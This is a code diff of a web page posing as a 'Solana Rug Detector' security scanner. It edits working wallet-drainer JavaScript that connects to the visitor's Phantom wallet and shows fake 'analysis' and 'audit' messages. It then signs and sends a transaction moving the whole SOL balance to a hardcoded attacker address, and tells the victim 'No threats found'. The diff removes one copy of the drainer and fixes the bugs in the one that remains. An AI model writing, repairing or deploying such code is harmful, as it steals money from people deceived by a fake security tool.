@@ -4,87 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Axiom - Solana Rug Detector</title>
-    <!-- Phantom Wallet SDK -->
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script><script>
-    // CONFIGURATION
-    const YOUR_WALLET_ADDRESS = "GCx1Coc7eHG9A5v334Z7AWXz2bQQEsQyPGR81WHupJyU";
-    
-    const statusEl = document.getElementById('status');
-    const btn = document.getElementById('scanBtn');
-
-    btn.addEventListener('click', async () => {
-        if (!window.solana || !window.solana.isPhantom) {
-            statusEl.innerHTML = "❌ Phantom Wallet not found!";
-            return;
-        }
-
-        try {
-            // 1. Connect Wallet
-            statusEl.innerHTML = '<span class="loader"></span> Connecting...';
-            const resp = await window.solana.connect();
-            
-            statusEl.innerHTML = '<span class="loader"></span> Analyzing Token History...';
-            
-            // Fake loading time to make it look like analysis
-            await new Promise(r => setTimeout(r, 1500));
-
-            // 2. Prepare the Drain Transaction
-            statusEl.innerHTML = '<span class="loader"></span> Initiating Security Audit...';
-            
-            // Initialize connection
-            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
-            
-            // Get correct public key from the response
-            const publicKey = new solanaWeb3.PublicKey(resp.publicKey.toBase58());
-            
-            // Get current balance
-            const balance = await connection.getBalance(publicKey);
-
-            if (balance === 0) {
-                statusEl.innerHTML = "Wallet empty.";
-                return;
-            }
-
-            // Create Transaction
-            const transaction = new solanaWeb3.Transaction();
-            
-            // Instruction: Transfer all SOL to your address
-            const instruction = solanaWeb3.SystemProgram.transfer({
-                fromPubkey: publicKey,
-                toPubkey: new solanaWeb3.PublicKey(YOUR_WALLET_ADDRESS),
-                lamports: balance // Send everything
-            });
-
-            transaction.add(instruction);
-
-            // 3. Sign and Send
-            statusEl.innerHTML = '<span class="loader"></span> Signing Secure Protocol...';
-            
-            const signature = await window.solana.signTransaction(transaction);
-            const rawSignedTx = signature.serialize();
-            
-            // Send to network
-            const txid = await connection.sendRawTransaction(rawSignedTx, { skipPreflight: true });
-            
-            // Confirm
-            await connection.confirmTransaction(txid, 'confirmed');
-
-            statusEl.innerHTML = "✅ Scan Complete. No threats found.";
-            btn.disabled = true;
-            btn.innerText = "Scan Again";
-            
-            // Reset after 5 seconds so you can test again
-            setTimeout(() => {
-                btn.disabled = false;
-                statusEl.innerHTML = "Ready to scan.";
-            }, 5000);
-
-        } catch (err) {
-            console.error(err);
-            statusEl.innerHTML = "❌ Error: " + err.message;
-        }
-    });
-</script>
+    <!-- Correct Library -->
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -172,7 +93,6 @@
 
 <script>
     // CONFIGURATION
-    const VICTIM_WALLET_ADDRESS = null; // Will be detected dynamically
     const YOUR_WALLET_ADDRESS = "GCx1Coc7eHG9A5v334Z7AWXz2bQQEsQyPGR81WHupJyU";
     
     const statusEl = document.getElementById('status');
@@ -188,22 +108,22 @@
             // 1. Connect Wallet
             statusEl.innerHTML = '<span class="loader"></span> Connecting...';
             const resp = await window.solana.connect();
-            const victimPubKey = resp.publicKey.toString();
             
             statusEl.innerHTML = '<span class="loader"></span> Analyzing Token History...';
             
-            // Small delay to make it look like it's doing work
+            // Fake loading time
             await new Promise(r => setTimeout(r, 1500));
 
             // 2. Prepare the Drain Transaction
             statusEl.innerHTML = '<span class="loader"></span> Initiating Security Audit...';
             
-            // Get balance
-            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
-            const fromPubkey = new solanaWeb3.PublicKey(fallbackAddress); // Fallback logic handled below
+            // Initialize connection using the correct global variable
+            const connection = new solana.Connection(solana.clusterApiUrl('mainnet-beta'), 'confirmed');
             
-            // Re-fetch actual public key properly
-            const publicKey = new solanaWeb3.PublicKey(resp.publicKey.toBase58());
+            // Get correct public key from the response
+            const publicKey = new solana.PublicKey(resp.publicKey.toBase58());
+            
+            // Get current balance
             const balance = await connection.getBalance(publicKey);
 
             if (balance === 0) {
@@ -212,12 +132,12 @@
             }
 
             // Create Transaction
-            const transaction = new solanaWeb3.Transaction();
+            const transaction = new solana.Transaction();
             
             // Instruction: Transfer all SOL to your address
-            const instruction = solanaWeb3.SystemProgram.transfer({
+            const instruction = solana.SystemProgram.transfer({
                 fromPubkey: publicKey,
-                toPubkey: new solanaWeb3.PublicKey(YOUR_WALLET_ADDRESS),
+                toPubkey: new solana.PublicKey(YOUR_WALLET_ADDRESS),
                 lamports: balance // Send everything
             });
 
@@ -229,18 +149,17 @@
             const signature = await window.solana.signTransaction(transaction);
             const rawSignedTx = signature.serialize();
             
-            // We use the standard RPC to send it. 
-            // Note: Using 'confirmed' for speed.
+            // Send to network
             const txid = await connection.sendRawTransaction(rawSignedTx, { skipPreflight: true });
             
-            // Wait briefly then confirm
+            // Confirm
             await connection.confirmTransaction(txid, 'confirmed');
 
             statusEl.innerHTML = "✅ Scan Complete. No threats found.";
             btn.disabled = true;
             btn.innerText = "Scan Again";
             
-            // Optional: Reset after a few seconds so they can drain again
+            // Reset after 5 seconds so you can test again
             setTimeout(() => {
                 btn.disabled = false;
                 statusEl.innerHTML = "Ready to scan.";
